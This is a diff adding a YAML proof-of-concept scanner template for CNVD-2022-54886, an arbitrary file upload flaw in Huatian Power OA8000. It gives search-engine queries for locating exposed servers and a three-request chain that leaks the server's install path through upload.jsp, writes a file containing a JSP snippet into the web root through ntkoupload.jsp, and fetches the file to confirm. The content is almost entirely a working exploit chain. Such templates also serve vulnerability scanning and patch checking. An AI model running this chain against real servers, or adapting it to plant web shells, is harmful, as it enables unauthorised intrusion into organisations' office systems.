@@ -1,0 +1,64 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="华天动力-OA8000"
+    hunter-query: app.name="华天软件 OA"
+    quake-query: app:"华天动力OA"
+    zoomeye-query: app:"CNPOWER OA"
+    threatbook-query:
+    cve: 
+    cnvd: 2022-54886
+    tips:  /OAapp/htpages/app/module/login/xx.txt    |  绝对路径 E:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/xx.txt
+
+name: poc-yaml-cnpower-8000-ntkoupload-upload
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /OAapp/jsp/upload.jsp
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}  
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"xxx.xml\"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\nxxx.png\r\n------WebKitFormBoundary{{s2}}--"
+    expression: >-
+      response.status == 200 && response.body.bcontains(b'FILE') && response.body.bcontains(b'webapps')
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+  r1:
+    request:
+      method: POST
+      cache: true
+      path: /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"EDITFILE\"; filename=\"xxx.txt\"\r\nContent-Type: image/png\r\n\r\n<%out.print(\"{{s2}}\");%>\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"newFileName\"\r\n\r\n{{path}}/webapps/OAapp/htpages/app/module/login/{{s2}}.txt\r\n------WebKitFormBoundary{{s2}}--"
+    expression: >-
+      response.status == 200 && response.raw_header.bcontains(b"text/html")
+
+  r2:
+    request:
+      method: GET
+      cache: true
+      path: /OAapp/htpages/app/module/login/{{s2}}.txt
+      follow_redirects: false
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains(string(s2))
+
+expression: r0() && r1() && r2()
